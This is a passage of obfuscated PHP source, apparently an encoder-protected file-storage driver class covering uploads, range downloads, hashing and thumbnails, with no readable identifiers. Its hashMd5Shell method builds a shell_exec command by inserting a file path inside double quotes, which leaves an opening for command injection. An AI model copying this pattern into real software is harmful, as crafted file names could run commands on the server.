($D°È¦Éòä as $E»è÷ğ›ù) { if ($E»è÷ğ›ù[$EÃÀº®Ö[29]] == $EÃÀº®Ö[86]) { $B˜ß¨á’ß¨[$EÃÀº®Ö[89]]++; $EÖ¦»ÈëãÚ = $this->getPathInner($E»è÷ğ›ù[$EÃÀº®Ö[85]]); $this->infoChildren($EÖ¦»ÈëãÚ, $B˜ß¨á’ß¨); } else { $B˜ß¨á’ß¨[$EÃÀº®Ö[88]]++; $B˜ß¨á’ß¨[$EÃÀº®Ö[87]] += $E»è÷ğ›ù[$EÃÀº®Ö[87]]; } } } public function fileSubstr($AÑ·„ï„êæ, $dâ´„ÊŠ ¢, $Dª’³ó„«) { } public function listAll($aå‡™÷±Üµ) { } public function upload($B¬•äÉÖö­, $a„à ÆÓ»œ, $A½´ßŒòñ– = false, $fï‚Ü¯ªŒÙ = REPEAT_REPLACE) { } public function uploadFileByID($dÛÕĞ­×ã˜, $FË¼Ú­«×ø, $d‹‡’‚ğÍé) { } public function uploadFileByPath($bÌğ²Í´ÅÑ, $eæ‘°Ü•ùÉ, $aï÷¨÷îøš = array()) { } public function isUploadServer() { $AëÇŒæé¶Ò =& $_SERVER[¢Í]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $AëÇŒæé¶Ò[93]) { return !0; } return $GLOBALS[$AëÇŒæé¶Ò[6]][$AëÇŒæé¶Ò[94]][$AëÇŒæé¶Ò[95]]; } public function isFileOutServer() { $C‘™¸¡õèá =& $_SERVER[¢Í]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $C‘™¸¡õèá[93]) { return !0; } return $GLOBALS[$C‘™¸¡õèá[6]][$C‘™¸¡õèá[94]][$C‘™¸¡õèá[96]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Bº¬¾ã‡µŒ) { $aøÏ¦é÷ † =& $_SERVER[¢Í]; if (!$this->isCdnHost()) { return $Bº¬¾ã‡µŒ; } return str_replace(trim(get_url_root($Bº¬¾ã‡µŒ), $aøÏ¦é÷ †[8]), trim($this->cdnHost, $aøÏ¦é÷ †[8]), $Bº¬¾ã‡µŒ); } public function uploadLink($DéåÁ„†¯Õ, $DÅî¼›•¦• = 0) { goto eïÂ¥ÁŒß…; eïÂ¥ÁŒß…: $D¨ªĞçº =& $_SERVER[¢Í]; if ($this->isUploadServer()) { return; } $cŠòáøØÓ = $this->getType(); goto e•ßáÃŸ„; e•ßáÃŸ„: if (!in_array($cŠòáøØÓ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $f‰Ø¶Ö¬¶İ = 1024 * 1024 * 10; goto e—ç†ˆ©©; Cˆ•êãøÌ: if ($FØ‘Š‚‡“Ö) { $FØ‘Š‚‡“Ö[$D¨ªĞçº[99]] = $DéåÁ„†¯Õ; $FØ‘Š‚‡“Ö[$D¨ªĞçº[100]] = $cŠòáøØÓ; } return $FØ‘Š‚‡“Ö; goto c‹ö¹ˆ¼¥ä; e—ç†ˆ©©: $AˆâÙøœ = $DÅî¼›•¦• <= $f‰Ø¶Ö¬¶İ ? $D¨ªĞçº[97] : $D¨ªĞçº[98]; $B‘ÑÍ¿ó = (!$DÅî¼›•¦• ? 1 : ceil($DÅî¼›•¦• / pow(1024, 3))) * 3600 * 4; $FØ‘Š‚‡“Ö = $this->{$AˆâÙøœ}($DéåÁ„†¯Õ, $B‘ÑÍ¿ó); goto Cˆ•êãøÌ; c‹ö¹ˆ¼¥ä: } public function uploadFormData($eë“¢Ø‚Éä, $eÄ¡¡±¢»Ë = 3600) { } public function multiUploadFormData($c×Öó§‘˜, $BÖ¥æ††¢ = 3600) { } public function download($a‚è˜‹èê, $CİíçÛ¤±¯) { } public function ext($D¦”‹Ææ) { $a•ğƒ¯› =& $_SERVER[¢Í]; if (strpos($D¦”‹Ææ, $a•ğƒ¯›[8]) === -1) { $D¦š“ó“š’ = $D¦”‹Ææ; } else { $D¦š“ó“š’ = $this->pathThis($D¦”‹Ææ); } $cí·ÌÕ„‚‡ = $a•ğƒ¯›[33]; if (strstr($D¦š“ó“š’, $a•ğƒ¯›[101])) { $cí·ÌÕ„‚‡ = substr($D¦š“ó“š’, strrpos($D¦š“ó“š’, $a•ğƒ¯›[101]) + 1); $cí·ÌÕ„‚‡ = strtolower($cí·ÌÕ„‚‡); } if (strlen($cí·ÌÕ„‚‡) > 3 && preg_match($a•ğƒ¯›[102], $cí·ÌÕ„‚‡, $eÔ˜¶ğ™œí)) { $cí·ÌÕ„‚‡ = $a•ğƒ¯›[33]; } return $cí·ÌÕ„‚‡; } public function pathThis($e÷ç¡„¸É÷) { $D›«‡¡Ÿ‚œ =& $_SERVER[¢Í]; $e÷ç¡„¸É÷ = str_replace($D›«‡¡Ÿ‚œ[103], $D›«‡¡Ÿ‚œ[8], rtrim($e÷ç¡„¸É÷, $D›«‡¡Ÿ‚œ[8])); $f‡‘—¡İß· = strrpos($e÷ç¡„¸É÷, $D›«‡¡Ÿ‚œ[8]); if ($f‡‘—¡İß· === !1) { return $e÷ç¡„¸É÷; } return substr($e÷ç¡„¸É÷, $f‡‘—¡İß· + 1); } public function pathFather($Ağ‘‰§ğù‚) { $c—Äª¿òŠ¾ =& $_SERVER[¢Í]; $Ağ‘‰§ğù‚ = str_replace($c—Äª¿òŠ¾[103], $c—Äª¿òŠ¾[8], rtrim($Ağ‘‰§ğù‚, $c—Äª¿òŠ¾[8])); $F“¬›óø÷„ = strrpos($Ağ‘‰§ğù‚, $c—Äª¿òŠ¾[8]); if ($F“¬›óø÷„ === !1) { return $c—Äª¿òŠ¾[33]; } return substr($Ağ‘‰§ğù‚, 0, $F“¬›óø÷„ + 1); } public function hashSimple($eÏ‚É¢„†) { goto FœäÏÍ©Ì; B…£ÒâÇ„Í: $BÃÁØÉ®Ï = intval($c‚æÅ¥Šˆ / $F‹Çš¤ó¯š); $DÔºœÛ¨½ = $eÕ…¾’½à´[33]; for ($F¯Û”—°µÈ = 0; $F¯Û”—°µÈ < $F‹Çš¤ó¯š; $F¯Û”—°µÈ++) { $DÔºœÛ¨½ .= $this->fileSubstr($eÏ‚É¢„†, $BÃÁØÉ®Ï * $F¯Û”—°µÈ, $d×É–œÕ„ä); } goto a áî¤ªôò; a áî¤ªôò: $DÔºœÛ¨½ .= $this->fileSubstr($eÏ‚É¢„†, $c‚æÅ¥Šˆ - $d×É–œÕ„ä, $d×É–œÕ„ä); return md5($DÔºœÛ¨½) . $c‚æÅ¥Šˆ; goto d§‰´îîÎŸ; FœäÏÍ©Ì: $eÕ…¾’½à´ =& $_SERVER[¢Í]; if (!$eÏ‚É¢„†) { return md5($eÕ…¾’½à´[33]); } $c‚æÅ¥Šˆ = $this->size($eÏ‚É¢„†); goto F‘Ş¹ò©ÂŒ; F‘Ş¹ò©ÂŒ: $d×É–œÕ„ä = 200; $F‹Çš¤ó¯š = 50; if ($c‚æÅ¥Šˆ <= $d×É–œÕ„ä * $F‹Çš¤ó¯š) { return $this->hashMd5($eÏ‚É¢„†) . $c‚æÅ¥Šˆ; } goto B…£ÒâÇ„Í; d§‰´îîÎŸ: } public static $md5Cache = array(); public function hashMd5($DŒê³¼¢›) { $DŒê³¼¢› = $this->iconvSystem($DŒê³¼¢›); if (isset(self::$md5Cache[$DŒê³¼¢›])) { return self::$md5Cache[$DŒê³¼¢›]; } self::$md5Cache[$DŒê³¼¢›] = $this->hashMd5Shell($DŒê³¼¢›); if (!self::$md5Cache[$DŒê³¼¢›]) { self::$md5Cache[$DŒê³¼¢›] = @md5_file($DŒê³¼¢›); } return self::$md5Cache[$DŒê³¼¢›]; } private function hashMd5Shell($aÙÊ·†—í) { goto aåš±ÑêÎ›; Cä¯©µÅ²²: $C…Ï×Ó«ä = shell_exec($cÒ¼âÃù¿Ã . "\x20\42{$aÙÊ·†—í}\42"); $C…Ï×Ó«ä = str_replace($aÀªïç½¼´[110], $aÀªïç½¼´[33], $C…Ï×Ó«ä); return substr($C…Ï×Ó«ä, 0, 32); goto EŠ×ö„Œ‘æ; f¸×Á‹÷†±: $cÒ¼âÃù¿Ã = Cache::get($aÀªïç½¼´[107]); if (!$cÒ¼âÃù¿Ã) { $D®½Ü = BASIC_PATH . $aÀªïç½¼´[108]; $D”Ï§¨ö¬È = md5_file($D®½Ü); $cÒ¼âÃù¿Ã = $aÀªïç½¼´[109]; foreach ($BÉõ™˜¾» as $D†Ï×ç¿‡à) { $C…Ï×Ó«ä = shell_exec($D†Ï×ç¿‡à . "\x20\x22{$D®½Ü}\42"); if ($C…Ï×Ó«ä && substr(trim($C…Ï×Ó«ä), 0, 32) == $D”Ï§¨ö¬È) { $cÒ¼âÃù¿Ã = $D†Ï×ç¿‡à; break; } } Cache::set($aÀªïç½¼´[107], $cÒ¼âÃù¿Ã, 3600); } if ($cÒ¼âÃù¿Ã == $aÀªïç½¼´[109]) { return !1; } goto Cä¯©µÅ²²; aåš±ÑêÎ›: $aÀªïç½¼´ =& $_SERVER[¢Í]; if (!function_exists($aÀªïç½¼´[104])) { return !1; } $BÉõ™˜¾» = array($aÀªïç½¼´[105], $aÀªïç½¼´[106]); goto f¸×Á‹÷†±; EŠ×ö„Œ‘æ: } public function link($EòˆæÖ©Í) { return $EòˆæÖ©Í; } public function fileOut($A‚–ğàîÒŠ, $fÏŒ¢ºìóò = false, $f¡‘á„Ë­Œ = false, $cˆšÔÔ×É¬ = '') { goto F³Ÿİ‚²ç•; Aì®ÄÀ¼‰: header($C±ñ÷Ÿ¢àó[142] . $FÊä®™ä ª . $C±ñ÷Ÿ¢àó[134]); header($C±ñ÷Ÿ¢àó[143] . $B·ùŠƒŸ¡¡); header($C±ñ÷Ÿ¢àó[144]); goto aµê„¡ìŠÆ; Cñô‰Óøœ: $BÍéì©†¿ = 0; $b°õ—‰Èï = $eŒ¦ÂÒÕÜ - 1; $eËéÔ¦Åñ = $this->ext($B·ùŠƒŸ¡¡); goto c­´¶¿Šµ; F­¿í˜ŞÃ¨: $D™•ˆğ®È¼ = strtolower($_SERVER[$C±ñ÷Ÿ¢àó[149]]); if ($Bî†›¦Ûé && $D™•ˆğ®È¼ && $a”•ÂìÌ») { if (strstr($D™•ˆğ®È¼, $C±ñ÷Ÿ¢àó[150])) { header($C±ñ÷Ÿ¢àó[151] . $A‚–ğàîÒŠ); } else { if (strstr($D™•ˆğ®È¼, $C±ñ÷Ÿ¢àó[152])) { header($C±ñ÷Ÿ¢àó[153] . $A‚–ğàîÒŠ); } else { if (strstr($D™•ˆğ®È¼, $C±ñ÷Ÿ¢àó[154])) { header($C±ñ÷Ÿ¢àó[155] . $A‚–ğàîÒŠ); } } } if ($cĞ™ï™èá) { header($C±ñ÷Ÿ¢àó[156] . $cĞ™ï™èá); } return; } if (isset($_SERVER[$C±ñ÷Ÿ¢àó[157]])) { if (preg_match($C±ñ÷Ÿ¢àó[158], $_SERVER[$C±ñ÷Ÿ¢àó[157]], $fŞòÚäÆ‚¾)) { $BÍéì©†¿ = intval($fŞòÚäÆ‚¾[1]); if (!empty($fŞòÚäÆ‚¾[2])) { $b°õ—‰Èï = intval($fŞòÚäÆ‚¾[2]); } } header($C±ñ÷Ÿ¢àó[159]); header("\x43\x6f\156\164\145\156\x74\x2d\x52\x61\x6e\147\145\x3a\x20\142\171\x74\145\163\40{$BÍéì©†¿}\55{$b°õ—‰Èï}\57" . $eŒ¦ÂÒÕÜ); } else { header($C±ñ÷Ÿ¢àó[160]); } goto cèŒ—¹¥öŒ; FÎ·¾òÓ: $eŒ¦ÂÒÕÜ = $eê‰Èù²ß·[$C±ñ÷Ÿ¢àó[87]]; $FÊä®™ä ª = gmdate($C±ñ÷Ÿ¢àó[116], $eê‰Èù²ß·[$C±ñ÷Ÿ¢àó[117]]); $B·ùŠƒŸ¡¡ = $f¡‘á„Ë­Œ ? $f¡‘á„Ë­Œ : $this->iconvApp($eê‰Èù²ß·[$C±ñ÷Ÿ¢àó[28]]); goto Cñô‰Óøœ; cèŒ—¹¥öŒ: $aô‘ÒŞ¸¡´ = !0; if ($_SERVER[$C±ñ÷Ÿ¢àó[161]] == $C±ñ÷Ÿ¢àó[162] && $eŒ¦ÂÒÕÜ > 1204 * 1024 * 1024 * 2) { $aô‘ÒŞ¸¡´ = !1; } if ($aô‘ÒŞ¸¡´) { header($C±ñ÷Ÿ¢àó[163] . ($b°õ—‰Èï - $BÍéì©†¿ + 1)); } goto b¶Ÿ¨¡ãâî; cÒÖÚÜ‚Âï: header($C±ñ÷Ÿ¢àó[135]); header($C±ñ÷Ÿ¢àó[136]); header($C±ñ÷Ÿ¢àó[137]); goto Cæ’ˆ¨ïßˆ; Eì»í¶Ô›¶: @ob_end_clean(); set_timeout(); $eê‰Èù²ß· = $this->infoFull($A‚–ğàîÒŠ); goto FÎ·¾òÓ; F³Ÿİ‚²ç•: $C±ñ÷Ÿ¢àó =& $_SERVER[¢Í]; $this->cacheMethod(null, null); if (!$A‚–ğàîÒŠ || !$this->exist($A‚–ğàîÒŠ)) { show_json(LNG($C±ñ÷Ÿ¢àó[111]), !1, $f¡‘á„Ë­Œ); } goto fœÉÏ×Ú™; fœÉÏ×Ú™: $Bî†›¦Ûé = $this->getType() == $C±ñ÷Ÿ¢àó[112]; $a”•ÂìÌ» = $GLOBALS[$C±ñ÷Ÿ¢àó[6]][$C±ñ÷Ÿ¢àó[94]][$C±ñ÷Ÿ¢àó[113]][$C±ñ÷Ÿ¢àó[114]]; $cĞ™ï™èá = (double) $GLOBALS[$C±ñ÷Ÿ¢àó[6]][$C±ñ÷Ÿ¢àó[94]][$C±ñ÷Ÿ¢àó[113]][$C±ñ÷Ÿ¢àó[115]] * 1024 * 1024; goto Eì»í¶Ô›¶; aµê„¡ìŠÆ: header($C±ñ÷Ÿ¢àó[145] . $eŒ¦ÂÒÕÜ); header($C±ñ÷Ÿ¢àó[146]); if (!$fÏŒ¢ºìóò && $eËéÔ¦Åñ == $C±ñ÷Ÿ¢àó[147]) { if ($eŒ¦ÂÒÕÜ > 1024 * 1024 * 5) { die; } $A¯’¶¥çµ = $this->getContent($A‚–ğàîÒŠ); $A¯’¶¥çµ = Html::clearSVG($A¯’¶¥çµ); header($C±ñ÷Ÿ¢àó[148] . strlen($A¯’¶¥çµ)); echo $A¯’¶¥çµ; die; } goto F­¿í˜ŞÃ¨; c­´¶¿Šµ: if (in_array($eËéÔ¦Åñ, array($C±ñ÷Ÿ¢àó[118], $C±ñ÷Ÿ¢àó[119], $C±ñ÷Ÿ¢àó[120], $C±ñ÷Ÿ¢àó[121]))) { $eËéÔ¦Åñ = $C±ñ÷Ÿ¢àó[122]; } if (!$cˆšÔÔ×É¬) { $cˆšÔÔ×É¬ = md5($FÊä®™ä ª . $this->hashSimple($A‚–ğàîÒŠ)); } $cˆšÔÔ×É¬ = $C±ñ÷Ÿ¢àó[123] . $cˆšÔÔ×É¬ . $C±ñ÷Ÿ¢àó[123]; goto Bæ¨†‚Æì; Bæ¨†‚Æì: $E¢š¯µŠ…³ = get_file_mime($eËéÔ¦Åñ); if (strstr($E¢š¯µŠ…³, $C±ñ÷Ÿ¢àó[124])) { $E¢š¯µŠ…³ = $E¢š¯µŠ…³ . $C±ñ÷Ÿ¢àó[125]; } if ($fÏŒ¢ºìóò === !1 && !mime_support($E¢š¯µŠ…³)) { $fÏŒ¢ºìóò = !0; $E¢š¯µŠ…³ = $C±ñ÷Ÿ¢àó[126]; } goto D¸°ºÊÛ¨‚; D¸°ºÊÛ¨‚: header($C±ñ÷Ÿ¢àó[127]); header($C±ñ÷Ÿ¢àó[128] . $E¢š¯µŠ…³); $AæŸô¬ë¡â = rawurlencode($B·ùŠƒŸ¡¡); goto aéŸè£Øà; aéŸè£Øà: $AæŸô¬ë¡â = $C±ñ÷Ÿ¢àó[123] . $AæŸô¬ë¡â . $C±ñ÷Ÿ¢àó[129] . $AæŸô¬ë¡â; if ($fÏŒ¢ºìóò) { header($C±ñ÷Ÿ¢àó[130]); header($C±ñ÷Ÿ¢àó[131] . $AæŸô¬ë¡â); } else { header($C±ñ÷Ÿ¢àó[132] . $AæŸô¬ë¡â); } header($C±ñ÷Ÿ¢àó[133] . gmdate($C±ñ÷Ÿ¢àó[116], time() + 3600 * 24 * 30) . $C±ñ÷Ÿ¢àó[134]); goto cÒÖÚÜ‚Âï; e„µåÕ÷ßµ: if ($cĞ™ï™èá) { $d¨ùã½ˆÖ = intval(1000 * 1000 * ($DÖ†î¼®ğ¾ / $cĞ™ï™èá)); } while ($BÍéì©†¿ <= $b°õ—‰Èï) { $fó”¡™Û‚ó = timeFloat(); check_abort(); $CÇ÷ğœã§Ç = $b°õ—‰Èï - $BÍéì©†¿ + 1; if ($CÇ÷ğœã§Ç <= $DÖ†î¼®ğ¾) { $DÖ†î¼®ğ¾ = $CÇ÷ğœã§Ç; } echo $this->fileSubstr($A‚–ğàîÒŠ, $BÍéì©†¿, $DÖ†î¼®ğ¾); $BÍéì©†¿ += $DÖ†î¼®ğ¾; if ($DÖ†î¼®ğ¾ == $CÇ÷ğœã§Ç) { $BÍéì©†¿ = $b°õ—‰Èï + 1; } if ($d¨ùã½ˆÖ) { $EÀ õĞ¨×Â = intval(1000 * 1000 * (timeFloat() - $fó”¡™Û‚ó)); $fƒ‘ñ÷®ª¸ = $d¨ùã½ˆÖ - $EÀ õĞ¨×Â; if ($fƒ‘ñ÷®ª¸ > 5) { usleep($fƒ‘ñ÷®ª¸); } } } goto b¢î«ôŒ®; Cæ’ˆ¨ïßˆ: if (isset($_SERVER[$C±ñ÷Ÿ¢àó[138]]) && strtotime($_SERVER[$C±ñ÷Ÿ¢àó[138]]) == $eê‰Èù²ß·[$C±ñ÷Ÿ¢àó[117]]) { header($C±ñ÷Ÿ¢àó[139], !0, 304); die; } if (isset($_SERVER[$C±ñ÷Ÿ¢àó[140]]) && $_SERVER[$C±ñ÷Ÿ¢àó[140]] == $cˆšÔÔ×É¬) { header($C±ñ÷Ÿ¢àó[141] . $cˆšÔÔ×É¬, !0, 304); die; } header($C±ñ÷Ÿ¢àó[141] . $cˆšÔÔ×É¬); goto Aì®ÄÀ¼‰; b¶Ÿ¨¡ãâî: if ($_SERVER[$C±ñ÷Ÿ¢àó[164]] == $C±ñ÷Ÿ¢àó[165]) { return; } $DÖ†î¼®ğ¾ = 1024 * 100; $d¨ùã½ˆÖ = 0; goto e„µåÕ÷ßµ; b¢î«ôŒ®: } public function fileOutServer($EÇ ­Ô›œœ, $C™ŒŒ‰äÅ„ = false, $cğÃ‰Õˆß¾ = false, $Bİ‹ˆ¬ß•õ = '') { $this->fileOut($EÇ ­Ô›œœ, $C™ŒŒ‰äÅ„, $cğÃ‰Õˆß¾, $Bİ‹ˆ¬ß•õ); } public function fileOutLink($B¥Ş ¢Ô––) { header($_SERVER[¢Í][166] . $B¥Ş ¢Ô––); die; } public function cacheMethod($Bê¢Î®Î’†, $céë´·’Œ, $f«¤æ¬ì = null) { goto E²×ª‹¥Ü”; D‡Ìö”òÎó: $F·Ã«‚½Õ‹ = $this->{$Bê¢Î®Î’†}($céë´·’Œ); $F©õ½½„’[$eº­Á‚©ğ] = $F·Ã«‚½Õ‹; return $F·Ã«‚½Õ‹; goto C•‘‰èÈ¢ù; E²×ª‹¥Ü”: $DÔì‰‚Ôˆù =& $_SERVER[¢Í]; static $F©õ½½„’ = array(); $C®î¢ù¨Ø÷ = $céë´·’Œ ? ltrim($this->getPathOuter($céë´·’Œ), $DÔì‰‚Ôˆù[8]) : $céë´·’Œ; goto F­Û ¤§·×; CÕ”âˆàÔ: if (!is_null($f«¤æ¬ì)) { $F©õ½½„’[$eº­Á‚©ğ] = $f«¤æ¬ì; return; } $F·Ã«‚½Õ‹ = isset($F©õ½½„’[$eº­Á‚©ğ]) ? $F©õ½½„’[$eº­Á‚©ğ] : null; if (!is_null($F·Ã«‚½Õ‹)) { return $F·Ã«‚½Õ‹; } goto D‡Ìö”òÎó; F­Û ¤§·×: $eº­Á‚©ğ = $DÔì‰‚Ôˆù[167] . $Bê¢Î®Î’† . $DÔì‰‚Ôˆù[168] . rtrim($C®î¢ù¨Ø÷, $DÔì‰‚Ôˆù[8]); if (is_null($Bê¢Î®Î’†)) { $F©õ½½„’ = array(); return; } if (is_null($céë´·’Œ)) { unset($F©õ½½„’[$eº­Á‚©ğ]); return; } goto CÕ”âˆàÔ; C•‘‰èÈ¢ù: } public function fileOutImage($f®äğò‹Æ–, $E‰­ñŒÉ×Ó = 250) { goto f–ì—¦Øåõ; B°ÈŞÌ«šÓ: IO::fileOut($f„¸òèº³ã); goto cøÉˆ¾´¦ˆ; f“ëÏóÂÆÖ: if ($C–ùÀÊª©¾[$D»°·Ç‘Öò[87]] <= 1024 * 50 || $aöáçÙÉï || !function_exists($D»°·Ç‘Öò[174]) || $C–ùÀÊª©¾[$D»°·Ç‘Öò[175]] == $D»°·Ç‘Öò[176]) { return $this->fileOut($f®äğò‹Æ–, !1, $dËÕÆ£†±¦); } if (isset($C–ùÀÊª©¾[$D»°·Ç‘Öò[171]][$D»°·Ç‘Öò[177]])) { $Eáòàó·Ó¿ = $C–ùÀÊª©¾[$D»°·Ç‘Öò[171]][$D»°·Ç‘Öò[177]]; } else { if (isset($C–ùÀÊª©¾[$D»°·Ç‘Öò[171]][$D»°·Ç‘Öò[178]])) { $Eáòàó·Ó¿ = $C–ùÀÊª©¾[$D»°·Ç‘Öò[171]][$D»°·Ç‘Öò[178]]; } else { $Eáòàó·Ó¿ = md5("{$C–ùÀÊª©¾[$D»°·Ç‘Öò[28]]}\137{$C–ùÀÊª©¾[$D»°·Ç‘Öò[85]]}\137{$C–ùÀÊª©¾[$D»°·Ç‘Öò[87]]}"); } } $Fµ«éêÌ¶ = "{$Eáòàó·Ó¿}\x5f{$E‰­ñŒÉ×Ó}\56\160\x6e\x67"; goto eêåöò¦¥; aÁÚÉÕÆø²: $dËÕÆ£†±¦ = $C–ùÀÊª©¾[$D»°·Ç‘Öò[28]]; $aöáçÙÉï = !1; if (isset($GLOBALS[$D»°·Ç‘Öò[169]]) && $GLOBALS[$D»°·Ç‘Öò[169]][$D»°·Ç‘Öò[85]] == $C–ùÀÊª©¾[$D»°·Ç‘Öò[85]]) { $C¡Ÿ÷Ö‹µ = $GLOBALS[$D»°·Ç‘Öò[169]][$D»°·Ç‘Öò[170]]; if (!$C–ùÀÊª©¾[$D»°·Ç‘Öò[171]]) { $C–ùÀÊª©¾[$D»°·Ç‘Öò[171]] = $GLOBALS[$D»°·Ç‘Öò[169]]; } if (isset($C¡Ÿ÷Ö‹µ[$D»°·Ç‘Öò[172]])) { if ($C¡Ÿ÷Ö‹µ[$D»°·Ç‘Öò[172]] <= $E‰­ñŒÉ×Ó && $C¡Ÿ÷Ö‹µ[$D»°·Ç‘Öò[173]] <= $E‰­ñŒÉ×Ó) { $aöáçÙÉï = !0; } } $dËÕÆ£†±¦ = $C–ùÀÊª©¾[$D»°·Ç‘Öò[171]][$D»°·Ç‘Öò[28]]; } goto f“ëÏóÂÆÖ; f–ì—¦Øåõ: $D»°·Ç‘Öò =& $_SERVER[¢Í]; if (substr($f®äğò‹Æ–, 0, 4) == $D»°·Ç‘Öò[154]) { $this->fileOutLink($f®äğò‹Æ–); } $C–ùÀÊª©¾ = $this->info($f®äğò‹Æ–); goto aÁÚÉÕÆø²; eêåöò¦¥: if (!($eÁâé”“®ï = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $D»°·Ç‘Öò[179]))) { $cß¼é÷Ï ¢ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $D»°·Ç‘Öò[180]); } else { $cß¼é÷Ï ¢ = KodIO::make($eÁâé”“®ï); } if ($eÁâé”“®ï = IO::fileNameExist($cß¼é÷Ï ¢, $Fµ«éêÌ¶)) { $e•ŠÚš›™Ô = KodIO::make($eÁâé”“®ï); return IO::fileOut($e•ŠÚš›™Ô, !1, $dËÕÆ£†±¦); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto bïé›¹ª¼Û; D¹Ö –¯šç: if (!file_exists($e•ŠÚš›™Ô) || filesize($e•ŠÚš›™Ô) < 100) { return @file_exists($d·…éÑæùÊ) ? IO::fileOut($d·…éÑæùÊ) : $this->fileOut($f®äğò‹Æ–); } if (!($f„¸òèº³ã = IO::move($e•ŠÚš›™Ô, $cß¼é÷Ï ¢))) { return IO::fileOut($e•ŠÚš›™Ô); } del_file($e•ŠÚš›™Ô); goto B°ÈŞÌ«šÓ; bïé›¹ª¼Û: $e•ŠÚš›™Ô = DATA_THUMB . $Fµ«éêÌ¶; del_file($e•ŠÚš›™Ô); if (!@file_exists($e•ŠÚš›™Ô)) { $FîåÔ‘Úù = TEMP_FILES; if (!is_dir($FîåÔ‘Úù)) { mk_dir($FîåÔ‘Úù); } $d·…éÑæùÊ = $FîåÔ‘Úù . $Eáòàó·Ó¿ . $D»°·Ç‘Öò[101] . $C–ùÀÊª©¾[$D»°·Ç‘Öò[175]]; if (!@file_exists($d·…éÑæùÊ)) { $d·…éÑæùÊ = $this->download($f®äğò‹Æ–, $d·…éÑæùÊ); } $D÷ê†»« Œ = new ImageThumb($d·…éÑæùÊ, $D»°·Ç‘Öò[181]); $D÷ê†»« Œ->prorate($e•ŠÚš›™Ô, $E‰­ñŒÉ×Ó, $E‰­ñŒÉ×Ó * 10); } goto D¹Ö –¯šç; cøÉˆ¾´¦ˆ: } public function fileOutImageServer($C¯Àóèì©ä, $Eö–µÍ¸á = 250) { $this->fileOutImage($C¯Àóèì©ä, $Eö–µÍ¸á); } public function fileNameAuto($cÕ±³³¡ñé, $F¥‘İ„±³­, $dù®æñ½ÑÌ = REPEAT_RENAME, $EŒÖ–ÏÄº = false) { goto BÓ·¨‰¤ä‰; BÓ·¨‰¤ä‰: $F’£»´ãò¾ =& $_SERVER[¢Í]; $A¯¸Ï†Ùë = $cÕ±³³¡ñé === $F’£»´ãò¾[33] ? $F¥‘İ„±³­ : rtrim($cÕ±³³¡ñé, $F’£»´ãò¾[8]) . $F’£»´ãò¾[8] . $F¥‘İ„±³­; if ($dù®æñ½ÑÌ == REPEAT_REPLACE || !$this->exist($A¯¸Ï†Ùë) || $EŒÖ–ÏÄº && $dù®æñ½ÑÌ != REPEAT_RENAME_FOLDER) { return $F¥‘İ„±³­; } goto e”Ñ°£É…ƒ; b•‘« ¶æô: while ($this->exist(rtrim($cÕ±³³¡ñé, $F’£»´ãò¾[8]) . $F’£»´ãò¾[8] . $Bß¼¹Íøù)) { $Bß¼¹Íøù = $F’–ê—ëïä . "\x28{$bé„³¦«ÙŠ}\x29{$A¤öëÎ‚¨É}"; $bé„³¦«ÙŠ++; } return $Bß¼¹Íøù; goto dÎ˜ÉØÆøó; dŸ»¶º‘–í: $bé„³¦«ÙŠ = 1; $F’–ê—ëïä = substr($F¥‘İ„±³­, 0, strlen($F¥‘İ„±³­) - strlen($A¤öëÎ‚¨É)); $Bß¼¹Íøù = $F’–ê—ëïä . "\x28{$bé„³¦«ÙŠ}\51{$A¤öëÎ‚¨É}"; goto b•‘« ¶æô; e”Ñ°£É…ƒ: if ($dù®æñ½ÑÌ == REPEAT_SKIP) { return !1; } $A¤öëÎ‚¨É = $F’£»´ãò¾[101] . get_path_ext($F¥‘İ„±³­); $A¤öëÎ‚¨É = $A¤öëÎ‚¨É == $F’£»´ãò¾[101] || $EŒÖ–ÏÄº ? $F’£»´ãò¾[33] : $A¤öëÎ‚¨É; goto dŸ»¶º‘–í; dÎ˜ÉØÆøó: } public function listAllFiles($dçœ¯÷óã¢, $EÈø¹‘éö, $F™Ø‹³ç¾˜ = array()) { goto aã¨Ë¯ÊåÖ; B÷—©ºá…°: $dçœ¯÷óã¢ = trim($dçœ¯÷óã¢, $fÏ‡‰ƒÒùÂ[8]); foreach ($EÈø¹‘éö as $açô¦ÌÜ‰) { $EÚ—“¿…®ø = ltrim(substr(trim($açô¦ÌÜ‰, $fÏ‡‰ƒÒùÂ[8]), strlen($dçœ¯÷óã¢)), $fÏ‡‰ƒÒùÂ[8]); $b‘Àƒ†‡†× = array_merge($b‘Àƒ†‡†×, $this->slicePath($EÚ—“¿…®ø)); } $bÌÌí©ƒ = array(); goto BŒƒö“•‡; BŒƒö“•‡: foreach (array_unique($b‘Àƒ†‡†×) as $açô¦ÌÜ‰) { $fÅ¸ğİ²“ã = array($fÏ‡‰ƒÒùÂ[85] => $this->getPathOuter($fÏ‡‰ƒÒùÂ[8] . $dçœ¯÷óã¢ . $fÏ‡‰ƒÒùÂ[8] . $açô¦ÌÜ‰), $fÏ‡‰ƒÒùÂ[86] => 1, $fÏ‡‰ƒÒùÂ[87] => 0); if (substr($açô¦ÌÜ‰, -1) != $fÏ‡‰ƒÒùÂ[8]) { $fÅ¸ğİ²“ã[$fÏ‡‰ƒÒùÂ[86]] = 0; $Dé–˜¼—²Æ = $this->getPath($dçœ¯÷óã¢ . $fÏ‡‰ƒÒùÂ[8] . $açô¦ÌÜ‰); $fÅ¸ğİ²“ã[$fÏ‡‰ƒÒùÂ[87]] = isset($F™Ø‹³ç¾˜[$Dé–˜¼—²Æ]) ? $F™Ø‹³ç¾˜[$Dé–˜¼—²Æ] : $this->size($Dé–˜¼—²Æ); } $bÌÌí©ƒ[] = $fÅ¸ğİ²“ã; } return $bÌÌí©ƒ; goto c©–·ö¥¿Õ; aã¨Ë¯ÊåÖ: $fÏ‡‰ƒÒùÂ =& $_SERVER[¢Í]; if (empty($EÈø¹‘éö)) { return array(); } $b‘Àƒ†‡†× = array(); goto B÷—©ºá…°; c©–·ö¥¿Õ: } public function slicePath($E°ˆ—¨¢†) { $d¸Ü¥Ä¾Ï— =& $_SERVER[¢Í]; $E¿¸¦ ·” = 